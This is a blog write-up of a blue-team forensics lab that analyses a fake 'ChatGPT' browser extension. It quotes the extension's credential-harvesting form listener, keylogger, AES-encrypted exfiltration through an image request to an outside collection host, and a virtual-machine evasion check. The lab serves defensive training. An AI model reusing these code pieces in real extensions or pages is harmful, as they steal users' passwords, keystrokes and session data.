---
title: FakeGPT Lab (blue team) | CyberDefenders
date: 2024-12-05 09:20:11 +/-TTTT
categories: [write-ups, forensics]
tags: [blue team,forensics, DFIR]
description: My writeup for the FakeGpt lab by CyberDefenders
---

> CyberDefenders ™ is a blue team training platform for SOC analysts, threat hunters, security blue teams and DFIR professionals to advance CyberDefense skills.
{: .prompt-info}

# Senario : 


`Your cybersecurity team has been alerted to suspicious activity on your organization's network. Several employees reported unusual behavior in their browsers after installing what they believed to be a helpful browser extension named "ChatGPT". However, strange things started happening: accounts were being compromised, and sensitive information appeared to be leaking.
Your task is to perform a thorough analysis of this extension identify its malicious components.`

# Questions :
<br>

```Q1- Which encoding method does the browser extension use to obscure target URLs, making them more difficult to detect during analysis?```

To answer this, let's take a look at the ```app.js``` file, especially the head of the code:
```js
function() {
    var _0xabc1 = function(_0x321a) {
        return _0x321a;
    };
    var _0x5eaf = function(_0x5fa1) {
        return btoa(_0x5fa1);
    };
    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
        if (targets.indexOf(window.location.hostname) !== -1) {
        // Event listeners and other logic...
    }
    }
```
These are IIFEs: Immediately Invoked Function Expressions. This pattern of anonymous functions is quite common in js for several reasons, obfuscation fr example. In our case, the first function doesn't do much, it simply takes a variable _0x321a and returns it, as an identity function.

However, the second function is interesting. It performs the conversion to Base64 using ```btoa``` :  a built-in function in js that takes a string and encodes it to Base64.



```ANSWER: Base64```

<br>
<br>

```Q2- Which website does the extension monitor for data theft, targeting user accounts to steal sensitive information?```

from the `app.js` again : 
```js
    const targets = [_0xabc1('d3d3LmZhY2Vib29rLmNvbQ==')];
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');

            if (username && password) {
                exfiltrateCredentials(username, password);
            }
        });
```

`d3d3LmZhY2Vib29rLmNvbQ==` this is obviously a base64, decoding it :
```shell
echo "d3d3LmZhY2Vib29rLmNvbQ==" | base64 --decode
```
and that should give us our answer :
`ANSWER:www.facebook.com`
<br>
<br>

```Q3- Which type of HTML element is utilized by the extension to send stolen data?```

this is the function responsible fr sending the stolen data, as fr hw it is done, see fr urself:
```js
    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }
```
This is a clever method for making an HTTP GET request without using traditional AJAX or fetch techniques. It is usually referred to as exfiltration via covert channels, where we use a medium not intended for communication as a communication medium. Of course, we do this to hide the fact that communication is taking place. Remember, we are stealing data here, which we got from our event listeners, etc. Now, how do we send the data to our server?! That is the whole point. You wouldn't go announcing it to everyone, "Hey, I am sending illegal stuff here, don't notice me!"

The most genius way is to find a dumb person and trick them into sending it for you, thinking it is legit. What happens here is kind of the same. Instead of connecting to the server ourselves, we create an image object and set its source to our server URL + the data we have to send. Of course, our server would already have logic in place to know how to handle our requests, etc. So, the browser will see the image and will try to load it by sending a request to the img.src. Just like this, we trick the browser into sending the data to our server, which is clever.

```ANSWER: <img>```
<br>
<br>

```Q4- What is the first specific condition in the code that triggers the extension to deactivate itself```

in the ```loader.js``` we have the following lines :

```js
    // Check if the browser is in a virtual environment
    if (navigator.plugins.length === 0 || /HeadlessChrome/.test(navigator.userAgent)) {
        alert("Virtual environment detected. Extension will disable itself.");
        chrome.runtime.onMessage.addListener(() => { return false; });
    }
```
and as we can see "Virtual environment detected. Extension will disable itself", means if the target is running on a virtual machine, the extension disables itself, don't mind the `alert()`stuff, a true malicious extention will not display that, still a malicious extention would disable itself if it detects that the target is running on a virtual machine or a headlessChrome, to avoid getting detected and thus murdered before accomplishing its sacred task....
anyway, in this snippest of code, to know if we are in a virtual machine or not, the logic is that virtual machines usually would not have plugins installed, same goes fr HeadlessChrome, as they are used fr automation and dev tasks by devs, so using the web API we get the lenght of the plugins array, if it 0, means that we are in a danger zone, a virtual machine, and our spy should stay quite to get unnoticed.

`A: navigator.plugins.length === 0`
<br>
<br>

```Q5- Which event does the extension capture to track user input submitted through forms?```

in the `app.js` :
```js
    if (targets.indexOf(window.location.hostname) !== -1) {
        document.addEventListener('submit', function(event) {
            let form = event.target;
            let formData = new FormData(form);
            let username = formData.get('username') || formData.get('email');
            let password = formData.get('password');
```
As you can see, the script checks if the current URL is a target for this script. If it is, an event listener for the submit event is added. When a form is submitted, it captures the credentials.

```A: submit```
<br>
<br>

```Q6- Which API or method does the extension use to capture and monitor user keystrokes ?```

the following snippest :
```js
        document.addEventListener('keydown', function(event) {
            var key = event.key;
            exfiltrateData('keystroke', key);
```
The keydown event is used to monitor keystrokes, the keydown event listener captures every key press and sends the key data using the exfiltrateData function.

`A: keydown`
<br>
<br>

```Q7- What is the domain where the extension transmits the exfiltrated data?```

To answer this, we should look fr the function that send data:
```js
    function sendToServer(encryptedData) {
        var img = new Image();
        img.src = 'https://Mo.Elshaheedy.com/collect?data=' + encodeURIComponent(encryptedData);
        document.body.appendChild(img);
    }
```
I already explained hw the requests are being sent etc..

`A: Mo.Elshaheedy.com`
<br>
<br>

```Q8- Which function in the code is used to exfiltrate user credentials, including the username and password?```

```js
         exfiltrateCredentials(username, password);
```
the function would be invoked when we get data from the target, that means in the part we listen fr the event `submit`, and if we were lucky and got any credentials, we send them using this fucn.

`A: exfiltrateCredentials(username, password);`
<br>
<br>

```Q9- Which encryption algorithm is applied to secure the data before sending?```

In the `crypto.js`, as u can see :
```js
(function() {
    window.CryptoUtils = {
        encrypt: function(data) {
            const key = CryptoJS.enc.Utf8.parse('SuperSecretKey123');
            const iv = CryptoJS.lib.WordArray.random(16);
            const encrypted = CryptoJS.AES.encrypt(data, key, { iv: iv });
            return encrypted.toString(CryptoJS.enc.Base64);
        }
    };
})();
```
understanding the func, the algorithm is the famous AES

`A : AES`
<br>
<br>

```Q10- What does the extension access to store or manipulate session-related data and authentication information?```
To answer this, we got to `manifest.json`:
```json
  "permissions": [
    "tabs",
    "http://*/*",
    "https://*/*",
    "storage",
    "webRequest",
    "webRequestBlocking",
    "cookies"
  ],
```
The `manifest.json` file is vital for the browser to understand how the extension should behave and what resources it requires. Without this file, the extension wouldn't function properly, and lucky we are to find `coockies` in the permessions, and it is what is being used in our case

`A : coockies` 



> I hope you find this lab enjoyable as it captures common techniques in cybersecurity. `Marcus Hutchins `once said that someone in the blue team (defensive security) might understand the techniques hackers use better than those in the red team (offensive security). Although this may seem absurd at first, it actually makes sense. The blue team deals with all sorts of tricks and techniques used by the red team, and over time and with experience, they start to see patterns and develop insights.
we are having AI assist in these tasks nowadays, what Marcus said was my motivation to explore some of the blue team and defense stuff. Yes, yes, I know it's not the aggressive side of me, but what can I say? I fell in love, and the recklessness is no longer there. The violent waves in my heart have subsided, and it is now calm and quiet. So, let me monitor and observe from the sidelines for now. See you folks!
{: .prompt-tip}

